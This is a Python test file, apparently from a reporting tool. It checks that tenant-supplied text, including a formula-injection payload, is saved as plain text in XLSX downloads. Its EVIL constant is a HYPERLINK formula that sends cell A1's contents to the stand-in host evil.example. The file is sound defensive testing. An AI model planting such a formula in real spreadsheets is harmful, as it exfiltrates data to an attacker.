"""Tenant-supplied text must never become a live formula in an XLSX download."""

from datetime import UTC, datetime
from io import BytesIO

from openpyxl import Workbook, load_workbook

from officesentry.reports import data_reports
from officesentry.reports.safe_xlsx import no_formulas

EVIL = '=HYPERLINK("https://evil.example/?"&A1,"Click")'


def test_no_formulas_stores_formula_text_as_text():
    wb = Workbook()
    wb.active.append([EVIL, "+1", "plain", 3])
    assert wb.active["A1"].data_type == "f"
    no_formulas(wb)
    out = BytesIO()
    wb.save(out)
    cell = load_workbook(BytesIO(out.getvalue())).active["A1"]
    assert cell.data_type == "s" and cell.value == EVIL


def test_detail_report_download_has_no_formulas():
    report = data_reports.DataReport("users", "Users", "", {"name": "Alpha"}, datetime.now(UTC))
    section = data_reports.Section("Users", ["Name", "Count"])
    section.add([EVIL, 2])
    report.sections.append(section)
    ws = load_workbook(BytesIO(data_reports.to_xlsx(report))).active
    assert ws["A2"].value == EVIL and ws["A2"].data_type == "s"
    assert ws["B2"].value == 2
